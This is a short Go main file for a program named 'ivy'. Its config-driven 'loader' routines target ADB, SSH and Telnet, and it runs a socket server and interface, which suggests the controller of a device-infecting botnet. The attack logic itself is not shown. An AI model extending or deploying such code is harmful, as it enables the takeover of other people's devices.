package main

import (
	io "ivy/util/io"
	config "ivy/util/config"
	server "ivy/util/server"
)


/*
    *    ivy
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


func main() {
	if config.LOADER_ENABLE == true && config.LOADER_OPTION == "--adb" {
		io.ExecuteLoaderOptionsADB()
	}
	if config.LOADER_ENABLE == true && config.LOADER_OPTION == "--ssh" {
		io.ExecuteLoaderOptionsTelnetandSSH()
	}
	if config.LOADER_ENABLE == true && config.LOADER_OPTION == "--telnet" {
		io.ExecuteLoaderOptionsTelnetandSSH()
	}
	go server.SocketServer()
	server.Interface()
}